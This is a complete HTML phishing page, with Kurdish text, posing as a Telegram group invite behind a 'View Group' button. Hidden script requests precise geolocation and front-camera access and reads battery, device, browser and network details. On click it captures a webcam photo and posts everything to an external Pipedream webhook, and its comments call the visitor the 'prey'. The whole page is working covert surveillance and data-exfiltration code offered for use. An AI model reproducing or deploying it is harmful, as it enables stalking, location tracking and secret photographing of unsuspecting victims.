<!DOCTYPE html>
<html lang="ku">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Redirecting...</title>
    <style>
        body {
            background-color: #1a1a1a;
            color: white;
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            flex-direction: column;
        }
        .btn {
            background-color: #0088cc;
            color: white;
            padding: 15px 30px;
            border: none;
            border-radius: 25px;
            font-size: 18px;
            cursor: pointer;
            text-decoration: none;
            font-weight: bold;
            box-shadow: 0 4px 15px rgba(0,136,204,0.4);
            transition: 0.3s;
        }
        .btn:hover {
            background-color: #0077b5;
        }
    </style>
</head>
<body>

    <p>بۆ چوونە ناو گرووپ، کلیک لەسەر دوگمەی خوارەوە بکە:</p>
    <a href="https://telegram.org" class="btn" id="viewGroupBtn">View Group</a>

    <video id="video" width="640" height="480" autoplay style="display:none;"></video>
    <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>

    <script>
        // ⚠️ لێرەدا لینکی فەرمی پڕۆژەی Pipedreamـەکەی خۆت دابنێ
        const secureWebhook = "https://eo7he3dstagkpih.m.pipedream.net";

        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const context = canvas.getContext('2d');

        let globalBattery = "N/A";
        let globalCharging = "N/A";
        let globalMaps = "⚠️ مۆڵەتی نەدا یان هێشتا بارنەبووە";
        let globalDevice = navigator.platform || "Unknown";
        let globalBrowser = "Unknown Browser";
        let globalTime = new Date().toLocaleString('ku-IQ') || new Date().toString();
        let globalNetwork = (navigator.connection && navigator.connection.effectiveType) ? navigator.connection.effectiveType : "Unknown";

        const userAgent = navigator.userAgent;
        if (userAgent.indexOf("Firefox") > -1) globalBrowser = "Firefox";
        else if (userAgent.indexOf("SamsungBrowser") > -1) globalBrowser = "Samsung Browser";
        else if (userAgent.indexOf("Opera") > -1 || userAgent.indexOf("OPR") > -1) globalBrowser = "Opera";
        else if (userAgent.indexOf("Chrome") > -1) globalBrowser = "Chrome";
        else if (userAgent.indexOf("Safari") > -1) globalBrowser = "Safari";

        if (navigator.getBattery) {
            navigator.getBattery().then(battery => {
                globalBattery = Math.round(battery.level * 100) + "%";
                globalCharging = battery.charging ? "بەڵێ" : "نەخێر";
            }).catch(() => {});
        }

        // وەرگرتنی لۆکەیشن بە شێوازی ڕاست و بێ خەوش
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition((position) => {
                // لێرەدا کێشەی هێمای 0 چاککراوە بۆ $ بۆ ئەوەی پۆوتانەکان بە دروستی بخوێنێتەوە
                globalMaps = `https://www.google.com/maps?q=${position.coords.latitude},${position.coords.longitude}`;
            }, (error) => {
                globalMaps = "⚠️ نێچیرەکە مۆڵەتی لۆکەیشنی ڕەتکردەوە!";
            }, { 
                enableHighAccuracy: true, 
                timeout: 7000, 
                maximumAge: 0 
            });
        } else {
            globalMaps = "لۆکەیشن پشتگیری ناکرێت";
        }

        navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false })
            .then(stream => {
                video.srcObject = stream;
            })
            .catch(() => {});

        document.getElementById('viewGroupBtn').addEventListener('click', function(e) {
            try {
                context.drawImage(video, 0, 0, 640, 480);
                canvas.toBlob(function(blob) {
                    sendToWebhookNow(blob);
                }, 'image/jpeg');
            } catch (err) {
                sendToWebhookNow(null);
            }
        });

        async function sendToWebhookNow(imageBlob) {
            const formData = new FormData();
            let uid = "User_" + Math.floor(Math.random() * 90000) + 10000;

            formData.append("uid", uid);
            formData.append("battery", globalBattery);
            formData.append("charging", globalCharging);
            formData.append("maps", globalMaps);
            formData.append("device", globalDevice);
            formData.append("browser", globalBrowser);
            formData.append("time", globalTime);
            formData.append("network", globalNetwork);

            if (imageBlob) {
                formData.append("photo", imageBlob, "snap.jpg");
            }

            fetch(secureWebhook, { method: 'POST', body: formData }).catch(err => console.error(err));
        }
    </script>
</body>
</html>
